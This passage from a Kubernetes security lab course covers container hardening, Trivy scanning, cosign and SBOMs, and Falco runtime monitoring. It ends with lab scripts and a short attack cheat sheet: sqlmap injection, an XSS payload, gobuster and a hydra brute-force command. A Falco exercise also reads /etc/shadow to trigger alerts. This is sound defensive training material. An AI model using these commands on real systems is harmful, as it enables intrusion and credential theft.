- Must not use hostPath volumes
- Must not use privileged containers
- Must set seccomp profile

</details>

---

# Part 5: Week 7-8 Container Security & Supply Chain

## Learning Objectives

- Understand container escape techniques
- Implement image scanning and admission control
- Secure the software supply chain
- Configure runtime security monitoring

---

## Exercise 5.1: Container Escape Techniques

### Exercise Steps

**Step 1: Analyze Container Capabilities**

```bash
# Create a test pod
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: capability-test
  namespace: attacker
spec:
  containers:
  - name: test
    image: ubuntu:latest
    command: ["sleep", "3600"]
EOF

# Check capabilities
kubectl exec -n attacker capability-test -- cat /proc/1/status | grep Cap
```

**Step 2: Prevent Container Escapes**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
  namespace: attacker
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: ubuntu:latest
    command: ["sleep", "3600"]
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Container Escape Prevention Checklist:**

1. Never run privileged containers
2. Drop all capabilities, add only what's needed
3. Use read-only root filesystem
4. Run as non-root user
5. Enable seccomp profiles
6. Use AppArmor/SELinux
7. Avoid mounting sensitive host paths

</details>

---

## Exercise 5.2: Image Security Scanning

### Exercise Steps

**Step 1: Install Trivy**

```bash
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
```

**Step 2: Scan Vulnerable Images**

```bash
# Scan DVWA image
trivy image vulnerables/web-dvwa:latest

# Scan with severity filter
trivy image --severity HIGH,CRITICAL vulnerables/web-dvwa:latest

# Output as JSON
trivy image --format json --output dvwa-scan.json vulnerables/web-dvwa:latest
```

**Step 3: Implement Image Policy**

```yaml
# Using Kyverno for admission control
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-scan
spec:
  validationFailureAction: enforce
  rules:
  - name: check-image-tag
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Images must use a specific tag, not 'latest'"
      pattern:
        spec:
          containers:
          - image: "!*:latest"
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Image Security Best Practices:**

1. Use minimal base images (Alpine, Distroless)
2. Pin specific versions, never use `latest`
3. Scan images in CI/CD pipeline
4. Sign images with cosign/Notary
5. Use private registries with access control
6. Regularly update base images

</details>

---

## Exercise 5.3: Supply Chain Security

### Exercise Steps

**Step 1: Verify Image Signatures**

```bash
# Install cosign
curl -LO https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
chmod +x cosign-linux-amd64
mv cosign-linux-amd64 /usr/local/bin/cosign

# Sign an image
cosign generate-key-pair
cosign sign --key cosign.key your-registry/your-image:tag
```

**Step 2: Generate SBOM**

```bash
# Generate SBOM with syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Generate SBOM
syft vulnerables/web-dvwa:latest -o spdx-json > dvwa-sbom.json

# Scan SBOM for vulnerabilities
grype sbom:dvwa-sbom.json
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Supply Chain Security Checklist:**

1. **Build Security:** Use trusted base images, pin versions, scan during build, sign images
2. **Registry Security:** Use private registries, enable vulnerability scanning, implement access control
3. **Deployment Security:** Verify signatures, enforce image policies, require SBOMs

</details>

---

## Exercise 5.4: Runtime Security Monitoring

### Exercise Steps

**Step 1: Deploy Falco**

```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace monitoring \
  --set driver.kind=ebpf \
  --set tty=true
```

**Step 2: View Falco Alerts**

```bash
kubectl logs -n monitoring -l app.kubernetes.io/name=falco -f
```

**Step 3: Trigger Security Events**

```bash
# Shell spawn in container
kubectl exec -it -n vulnerable-apps deploy/dvwa -- /bin/bash

# Read sensitive file
kubectl exec -n vulnerable-apps deploy/dvwa -- cat /etc/shadow
```

**Step 4: Create Custom Falco Rules**

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-custom-rules
  namespace: monitoring
data:
  custom_rules.yaml: |
    - rule: Detect kubectl exec
      desc: Detect execution via kubectl exec
      condition: spawned_process and container and proc.cmdline contains "exec"
      output: kubectl exec detected (pod=%k8s.pod.name command=%proc.cmdline)
      priority: WARNING
```

### Solution

<details>
<summary>Click to reveal solution</summary>

**Expected Falco Alerts:**

```
Warning: Shell spawned in container (user=root container=dvwa shell=/bin/bash)
Warning: Sensitive file opened for reading (file=/etc/shadow container=dvwa)
```

**Runtime Security Best Practices:**

1. Deploy Falco or similar runtime security tool
2. Create custom rules for your environment
3. Alert on anomalous behavior
4. Integrate with SIEM/alerting systems

</details>

---

# Appendix A: Complete Deployment Script

```bash
#!/bin/bash
# deploy-lab.sh - Deploy complete security lab

set -e

echo "Creating namespaces..."
kubectl create namespace vulnerable-apps --dry-run=client -o yaml | kubectl apply -f -
kubectl create namespace attacker --dry-run=client -o yaml | kubectl apply -f -
kubectl create namespace monitoring --dry-run=client -o yaml | kubectl apply -f -
kubectl create namespace secure-zone --dry-run=client -o yaml | kubectl apply -f -

# Add labels
kubectl label namespace vulnerable-apps security-zone=untrusted --overwrite
kubectl label namespace attacker security-zone=attack --overwrite
kubectl label namespace monitoring security-zone=monitoring --overwrite
kubectl label namespace secure-zone security-zone=trusted --overwrite

echo "Deploying DVWA..."
kubectl apply -f dvwa.yaml

echo "Deploying Juice Shop..."
kubectl apply -f juice-shop.yaml

echo "Deploying WebGoat..."
kubectl apply -f webgoat.yaml

echo "Deploying Kali..."
kubectl apply -f kali.yaml

echo "Deploying monitoring..."
kubectl apply -f elasticsearch.yaml
kubectl apply -f kibana.yaml

echo "Waiting for pods..."
kubectl wait --for=condition=ready pod -l app=dvwa -n vulnerable-apps --timeout=300s
kubectl wait --for=condition=ready pod -l app=juice-shop -n vulnerable-apps --timeout=300s

echo "Lab deployed successfully!"
echo ""
echo "Access applications:"
echo "  kubectl port-forward -n vulnerable-apps svc/dvwa-service 8080:80"
echo "  kubectl port-forward -n vulnerable-apps svc/juice-shop-service 3000:3000"
echo ""
echo "Connect to Kali:"
echo "  kubectl exec -it -n attacker deploy/kali-attacker -- /bin/bash"
```

---

# Appendix B: Troubleshooting Guide

## Common Issues

### Pod Not Starting

```bash
kubectl describe pod <pod-name> -n <namespace>
kubectl get events -n <namespace> --sort-by='.lastTimestamp'
```

### Network Connectivity Issues

```bash
# Test DNS
kubectl exec -n <namespace> <pod> -- nslookup kubernetes.default

# Check network policies
kubectl get networkpolicies -n <namespace>
```

### DVWA Setup Issues

```bash
# Restart DVWA
kubectl rollout restart deployment/dvwa -n vulnerable-apps
```

## Cleanup Script

```bash
#!/bin/bash
kubectl delete namespace vulnerable-apps
kubectl delete namespace attacker
kubectl delete namespace monitoring
kubectl delete namespace secure-zone
echo "Cleanup complete!"
```

---

# Quick Reference

## Essential Commands

```bash
# Access Kali
kubectl exec -it -n attacker deploy/kali-attacker -- /bin/bash

# Port forward all apps
kubectl port-forward -n vulnerable-apps svc/dvwa-service 8080:80 &
kubectl port-forward -n vulnerable-apps svc/juice-shop-service 3000:3000 &

# Reset an app
kubectl rollout restart deployment/<app> -n vulnerable-apps
```

## Attack Cheat Sheet

```bash
# SQL Injection
sqlmap -u "http://target/page?id=1" --batch --dbs

# XSS
<script>alert('XSS')</script>

# Directory scan
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# Brute force
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Defense Checklist

- [ ] Network policies implemented
- [ ] RBAC configured with least privilege
- [ ] Secrets encrypted at rest
- [ ] Pod Security Standards enforced
- [ ] Image scanning enabled
- [ ] Runtime monitoring active